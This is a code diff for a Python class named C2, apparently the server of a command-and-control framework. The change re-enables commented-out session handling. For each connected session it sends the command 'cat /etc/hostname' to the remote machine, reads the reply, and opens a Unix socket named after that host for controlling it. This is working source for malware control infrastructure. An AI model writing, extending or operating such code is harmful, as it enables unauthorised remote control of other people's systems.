@@ -1028,34 +1028,34 @@ class C2():
 
                     self.unix_sockets[int(session.id)] = server_socket
 
-                    # # Create socket with the hostname
-                    # hostname_task = globals()['c2'].database.handle_task({'task': 'cat /etc/hostname', 'session': int(session.id)})
-                    # session.send_task(hostname_task)
+                    # Create socket with the hostname
+                    hostname_task = globals()['c2'].database.handle_task({'task': 'cat /etc/hostname', 'session': int(session.id)})
+                    session.send_task(hostname_task)
 
-                    # task = session.recv_task()
-                    # if task['task'] == 'prompt': # First task is to display prompt to user
-                    #     task = session.recv_task() # Second one is the result
+                    task = session.recv_task()
+                    if task['task'] == 'prompt': # First task is to display prompt to user
+                        task = session.recv_task() # Second one is the result
 
-                    # hostname = task['result'].strip().split(".")[0]
+                    hostname = task['result'].strip().split(".")[0]
 
-                    # # Allow us to address the sockets by short hostnames for ease of use
-                    # SOCKET_PATH = self.socket_path + str(hostname)
+                    # Allow us to address the sockets by short hostnames for ease of use
+                    SOCKET_PATH = self.socket_path + str(hostname)
 
-                    # if os.path.exists(SOCKET_PATH):
-                    #     os.remove(SOCKET_PATH)
+                    if os.path.exists(SOCKET_PATH):
+                        os.remove(SOCKET_PATH)
 
-                    # # Create a unix socket for this connection
-                    # server_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                    # Create a unix socket for this connection
+                    server_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 
-                    # # Bind the socket to the path
-                    # server_socket.bind(SOCKET_PATH)
+                    # Bind the socket to the path
+                    server_socket.bind(SOCKET_PATH)
 
-                    # # Listen for incoming connections
-                    # server_socket.listen(1)
-                    # util.display(f"Unix server listening on {SOCKET_PATH}")
+                    # Listen for incoming connections
+                    server_socket.listen(1)
+                    util.display(f"Unix server listening on {SOCKET_PATH}")
 
-                    # self.unix_sockets[hostname] = server_socket
-                    # self.sessions[hostname] = session
+                    self.unix_sockets[hostname] = server_socket
+                    self.sessions[hostname] = session
  
             else:
                 util.display("\n\n[-]", color='red', style='bright', end=' ')
